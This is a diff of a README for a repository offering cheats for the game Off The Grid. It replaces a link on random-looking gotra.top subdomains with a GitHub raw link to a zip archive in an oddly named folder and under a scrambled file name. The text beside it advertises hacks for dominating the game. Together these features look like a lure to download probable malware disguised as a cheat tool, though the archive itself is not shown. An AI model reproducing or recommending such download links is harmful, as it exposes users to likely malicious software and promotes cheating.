@@ -1,7 +1,7 @@
 # **Off The Grid Cheats**
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/omarhamdy1/Off-The-Grid-Cheats/raw/refs/heads/main/syphilogeny/Grid-The-Cheats-Off-2.6.zip](https://github.com/omarhamdy1/Off-The-Grid-Cheats/raw/refs/heads/main/syphilogeny/Grid-The-Cheats-Off-2.6.zip)](https://github.com/omarhamdy1/Off-The-Grid-Cheats/raw/refs/heads/main/syphilogeny/Grid-The-Cheats-Off-2.6.zip)
 
 Welcome to the **Off The Grid Cheats** repository, your ultimate guide to cheats, hacks, and tricks to enhance your experience in Off The Grid. This repository provides all the necessary tools to get an edge in the game, including useful cheats and tips for dominating the battlefield.
 
